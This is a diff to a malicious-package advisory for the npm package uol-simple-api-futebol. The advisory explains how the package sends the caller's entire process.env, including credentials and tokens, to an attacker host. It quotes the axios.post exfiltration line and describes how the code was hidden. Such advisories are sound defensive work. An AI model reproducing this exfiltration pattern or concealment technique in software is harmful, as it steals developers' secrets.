@@ -1,22 +1,38 @@
 {
-  "modified": "2026-06-17T22:40:07Z",
+  "modified": "2026-06-29T07:11:16Z",
   "published": "2026-06-17T22:23:08Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-6087",
   "summary": "Malicious code in uol-simple-api-futebol (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (c78d7d6a66f5f57c16ee4d4d39ea4dbfd4ac5b76192de1a8da86099405848334)\nThe package advertises itself as a scraper of UOL football schedules, but its main exported function getJogos() routes through getUOLData() → prepareCacheMatchs(url), which POSTs an object containing the entire process.env to http://cache.xui-managers.site/global-cache over plain HTTP. The destination domain has no relationship to UOL or to any documented dependency, and the names 'prepareCacheMatchs' / 'global-cache' are cover-story labels — no caching is performed; the function's only effect is one-way export of the caller's environment. On developer and CI machines, process.env routinely contains credentials such as AWS_*, GITHUB_TOKEN, NPM_TOKEN, database URLs, and third-party API keys, all of which are silently shipped to the attacker-controlled host the moment the consumer queries football schedules. Code path observed in dist/index.js: const e = { stream_source: [url], test: process.env }; await axios.post(\"http://cache.xui-managers.site/global-cache\", e,...).\n",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (962c38ed6ec061ce6a530aeea5a960dfc2b75caec56f7a1bc648f6b6cb655271)\nThe package's only documented function, getJogos() (default export), unconditionally invokes an internal helper named prepareCacheMatchs which POSTs the caller's entire process.env (labeled as `test` in the payload, alongside the request URL as `stream_source`) over plain HTTP to the hardcoded endpoint http://cache.xui-managers.site/global-cache before performing the legitimate UOL football fetch. The destination is unrelated to the package's stated purpose (UOL football listings). The exfil call is wrapped in try/catch blocks that silently swallow errors, and the function is shipped as a single dense line appended to an otherwise normally formatted src/index.ts under a misleading cache-preparation name — both consistent with intentional concealment. On a developer or CI machine, process.env routinely contains cloud credentials (AWS keys), database passwords, npm/registry tokens, API keys, and — per the package's own README — FOOTBALL_API_KEY that users are instructed to place in a.env file. Every consumer of the documented API ends up shipping their full environment to the attacker-controlled host on first use.\n",
   "affected": [
     {
       "package": {
         "ecosystem": "npm",
         "name": "uol-simple-api-futebol"
       },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            }
+          ]
+        }
+      ],
       "versions": [
         "4.6.3",
-        "4.6.4"
+        "4.6.4",
+        "4.7.0"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -62,6 +78,10 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/uol-simple-api-futebol/v/4.6.4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/uol-simple-api-futebol/v/4.7.0"
     }
   ],
   "credits": [
@@ -76,23 +96,43 @@
   "database_specific": {
     "malicious-packages-origins": [
       {
-        "id": "IN-MAL-2026-006954",
-        "import_time": "2026-06-17T22:38:22.132387889Z",
-        "modified_time": "2026-06-17T22:23:08Z",
-        "sha256": "c78d7d6a66f5f57c16ee4d4d39ea4dbfd4ac5b76192de1a8da86099405848334",
         "source": "amazon-inspector",
+        "sha256": "c78d7d6a66f5f57c16ee4d4d39ea4dbfd4ac5b76192de1a8da86099405848334",
+        "import_time": "2026-06-17T22:38:22.132387889Z",
+        "id": "IN-MAL-2026-006954",
+        "modified_time": "2026-06-17T22:23:08Z",
         "versions": [
           "4.6.3"
         ]
       },
       {
-        "id": "IN-MAL-2026-006955",
-        "import_time": "2026-06-17T22:38:22.240769195Z",
-        "modified_time": "2026-06-17T22:23:11Z",
-        "sha256": "d70b17eeaa1e5da67e0a5254c05b4e4a214688db5be40b658aba36397178de97",
         "source": "amazon-inspector",
+        "sha256": "d70b17eeaa1e5da67e0a5254c05b4e4a214688db5be40b658aba36397178de97",
+        "import_time": "2026-06-17T22:38:22.240769195Z",
+        "id": "IN-MAL-2026-006955",
+        "modified_time": "2026-06-17T22:23:11Z",
         "versions": [
           "4.6.4"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "962c38ed6ec061ce6a530aeea5a960dfc2b75caec56f7a1bc648f6b6cb655271",
+        "import_time": "2026-06-29T07:09:09.584186584Z",
+        "id": "IN-MAL-2026-007745",
+        "modified_time": "2026-06-29T05:32:52Z",
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "4.7.0"
         ]
       }
     ]
